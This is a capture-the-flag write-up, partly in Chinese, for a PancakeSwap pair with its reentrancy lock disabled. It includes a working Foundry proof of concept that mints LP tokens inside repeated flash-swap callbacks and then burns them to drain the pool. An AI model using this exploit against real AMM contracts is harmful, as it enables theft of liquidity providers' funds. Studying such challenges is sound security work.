## Lockless Swap

No one likes locking (pun intended) in Pancakeswap, so we removed it. 

本题去掉了重入锁，把检查条件注释掉了。
``` solidity
    modifier lock() {
        // require(unlocked == 1, 'Pancake: LOCKED');
        unlocked = 0;
        _;
        unlocked = 1;
    }
```

``` solidity
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
            ...
            if (data.length > 0) {
                this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
                IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
                this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
            }
            ...
    }
```

我们可以多次闪电贷，每次贷出来的部分再用来组 LP，这样余额可以满足 k 值要求。

闪电贷的过程组了多次 LP，最终我们会拥有大量的 LP 代币，解除流动性，把池子掏空。

POC:
``` solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "src/Challenge.sol";

contract LocklessSwapChallenge is Test {
    Challenge private challenge;

    function setUp() public {
        challenge = new Challenge(address(0x0));
    }

    function test_locklessSwap() public {
        PancakePair pair = challenge.pair();
        challenge.faucet();

        uint256 amount0 = 39 ether;
        uint256 amount1 = 39 ether;

        for (uint256 i = 0; i < 10; i++) {
            challenge.pair().swap(amount0, amount1, address(this), abi.encode(uint256(1)));
        }

        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(this));

        challenge.token0().transfer(address(challenge.randomFolks()), 99 * 1e18);
        challenge.token1().transfer(address(challenge.randomFolks()), 99 * 1e18);

        assertTrue(challenge.isSolved());
    }

    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external {
        challenge.pair().sync();
        address pair = address(challenge.pair());
        ERC20 token0 = challenge.token0();
        ERC20 token1 = challenge.token1();

        token0.transfer(pair, amount0Out);
        token1.transfer(pair, amount1Out);
        challenge.pair().mint(address(this));
        
        token0.transfer(pair, 0.1 ether);
        token1.transfer(pair, 0.1 ether);
    }

}
```

